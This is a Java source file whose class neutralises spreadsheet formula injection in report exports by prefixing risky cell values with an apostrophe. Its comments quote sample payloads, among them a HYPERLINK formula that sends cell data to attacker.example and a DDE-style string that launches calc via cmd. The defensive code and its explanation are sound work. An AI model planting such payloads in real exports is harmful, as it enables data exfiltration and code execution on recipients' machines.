package ru.ludwigandreas.export.format;

/**
 * Neutralises text a spreadsheet would execute rather than display.
 *
 * <h2>The attack</h2>
 *
 * <p>A cell whose text begins with {@code =}, {@code +}, {@code -} or {@code @} is a formula in
 * Excel, LibreOffice and Google Sheets. A report is built out of data other people entered - a
 * customer name, a free-text note, a partner's description field - so a value such as
 * {@code =HYPERLINK("https://attacker.example/?"&A1,"Click")} or a {@code DDE} invocation arrives in
 * the file with the report's own authority behind it, and the recipient opens it because their
 * colleague sent it. It is the standard way an export turns into code execution on a finance
 * analyst's laptop, and it needs no vulnerability in this service at all.
 *
 * <h2>Why it lives in the writer base class</h2>
 *
 * <p>Because the failure mode is a format that forgets. "The CSV writer sanitises and the XLSX
 * writer does not" is the shape this mistake takes in practice - the risk reads as a CSV problem,
 * and a string cell in a workbook is exactly as executable. Putting it in
 * {@link AbstractReportWriter}, which every shipped writer extends and which calls it on every text
 * cell, makes forgetting structurally difficult rather than a matter of remembering.
 *
 * <h2>What it does, and what it does not</h2>
 *
 * <p>A dangerous value is prefixed with an apostrophe, which every spreadsheet reads as "the rest of
 * this is text". The alternatives were both worse: stripping the leading character silently changes
 * the data, and rejecting the row fails a report because a customer's note started with a minus
 * sign. The apostrophe is visible in the cell, which is a real cost, and it is the cost this
 * module accepts - a visibly escaped value is a question somebody asks, where a silently altered
 * one is not.
 *
 * <p>This is not quoting. Delimiters, quotes and newlines inside a value are the CSV writer's own
 * problem and are handled there; the two are independent and a value frequently needs both.
 */
public final class CellSanitizer {

    /** What a neutralised value is prefixed with; every spreadsheet reads it as "text follows". */
    public static final char TEXT_MARKER = '\'';

    /**
     * The characters that start a formula.
     *
     * <p>{@code =} and {@code @} are the obvious two. {@code +} and {@code -} are here because Excel
     * accepts a signed formula - {@code -1+1} is arithmetic, and so is
     * {@code -2+3+cmd|' /C calc'!A0}. Tab and carriage return are here because a value that begins
     * with either can shift the following characters into formula position depending on how the
     * receiving application trims leading whitespace, which differs between them.
     */
    private static final String DANGEROUS_PREFIXES = "=+-@\t\r";

    private CellSanitizer() {
    }

    /**
     * Returns the value as it is safe to write.
     *
     * @param value the text, or null
     * @return the value unchanged when it cannot be read as a formula, otherwise the value prefixed
     *         with {@link #TEXT_MARKER}
     */
    public static String sanitize(String value) {
        if (value == null || value.isEmpty()) {
            return value;
        }
        return isDangerous(value.charAt(0)) ? TEXT_MARKER + value : value;
    }

    /** Whether a value beginning with this character would be read as a formula. */
    public static boolean isDangerous(char first) {
        return DANGEROUS_PREFIXES.indexOf(first) >= 0;
    }
}
